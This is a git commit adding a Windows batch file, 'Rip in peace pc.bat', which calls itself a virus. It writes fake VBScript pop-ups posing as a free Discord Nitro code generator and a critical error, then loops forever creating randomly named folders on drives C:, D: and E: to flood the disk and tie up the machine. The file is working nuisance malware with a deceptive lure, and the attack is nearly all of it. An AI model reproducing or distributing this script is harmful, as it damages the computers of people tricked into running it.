73d50416e71d5645ba4fc110668b9da813568f09
Lol-cvm <81323182+Lol-cvm@users.noreply.github.com>
2021-05-25 19:12:12 +0300

    Create Rip in peace pc.bat

---
+++ Rip in peace pc.bat
@@ -0,0 +1,16 @@
+@echo WARNING! THIS VIRUS MIGHT DESTROY YOUR WINDOWS, PLEASE DO NUT RUN THIS ON YOUR REAL PC OR ON YOUR FRIEND'S ONE (bad joke btw) BEACUSE IT MIGHT RUIN THEIR PC
+TO CONTINUE AND CONFIRM THAT YOU READ THIS, PRESS ANY KEY.
+@echo off
+pause
+echo x=msgbox("Nitro Generator" ,0+64, "Welcome to free nitro gift codes generator 2069! Press ok to continue") >> msgbox2.vbs
+echo x=msgbox("CRITICAL ERROR" ,0+16, "Something went wrong, please press "Ok" to try agian.") >> msgbox.vbs
+:VIRUS
+cd /d C:
+md %RANDOM%
+cd /d D:
+md %RANDOM%
+cd /d E:
+md %RANDOM%
+goto VIRUS
+REM #######################
+REM errorcode401.blogspot.in
